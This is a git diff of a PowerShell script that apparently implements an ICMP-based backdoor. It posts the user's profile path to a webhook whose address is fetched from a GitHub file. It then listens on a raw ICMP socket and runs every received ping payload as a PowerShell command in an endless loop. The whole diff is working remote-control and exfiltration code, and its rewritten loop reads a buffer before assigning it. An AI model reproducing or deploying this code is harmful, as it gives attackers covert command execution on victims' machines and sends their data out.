@@ -23,22 +23,7 @@ function Send {
     $sc.Send([ipaddress]$IP, "20", $text, $PingOptions)
 } 
 
-#Ping receiver
-function Receive {
-    param (
-        [ipaddress]$BindingIP,
-        [int]$TimeOut = 20
-    )
-    $pRs = [System.Net.Sockets.Socket]::new([Net.Sockets.AddressFamily]::InterNetwork, [Net.Sockets.SocketType]::Raw, [Net.Sockets.ProtocolType]::Icmp)
-    $pRs.bind([system.net.IPEndPoint]::new([system.net.IPAddress]::Parse($BindingIP), 0))
-    $pRs.IOControl([Net.Sockets.IOControlCode]::ReceiveAll, [BitConverter]::GetBytes(1), $null)
-    $buffer = new-object byte[] $pRs.ReceiveBufferSize
-    $pRs.ReceiveTimeout = $TimeOut
-    $pRs.Receive($buffer) | out-null
-    $FeedBack = ([System.Text.Encoding]::ASCII.GetString($buffer[28..255]))
-    try { $FeedBack = ($FeedBack.Substring(0, ($FeedBack.IndexOf("~")))) }catch {}
-    write-host $FeedBack
-}
+
 
 $payload = @{
     "User" = "$($env:USERPROFILE)"
@@ -49,8 +34,18 @@ $payload = @{
 
 Send-Webhook -WebhookUrl ((iwr https://raw.githubusercontent.com/jh1sc/Conex/main/Wh).content) -Data $payload
 
+$pRs = [System.Net.Sockets.Socket]::new([Net.Sockets.AddressFamily]::InterNetwork, [Net.Sockets.SocketType]::Raw, [Net.Sockets.ProtocolType]::Icmp)
+$pRs.bind([system.net.IPEndPoint]::new([system.net.IPAddress]::Parse($BindingIP), 0))
+$pRs.IOControl([Net.Sockets.IOControlCode]::ReceiveAll, [BitConverter]::GetBytes(1), $null)
+
 while (1) {
-    $r = (Receive $BindingIP 0)
-    
-    powershell.exe -c "$r"
+    $FeedBack = ([System.Text.Encoding]::ASCII.GetString($buffer[28..255]))
+    $FeedBack = ($FeedBack.Substring(0, ($FeedBack.IndexOf("~"))))
+    powershell -c "$FeedBack"
+    Write-host Recieved: $FeedBack
+
+    $buffer = new-object byte[] $pRs.ReceiveBufferSize
+    $pRs.ReceiveTimeout = 0
+    $pRs.Receive($buffer) | out-null
+
 }
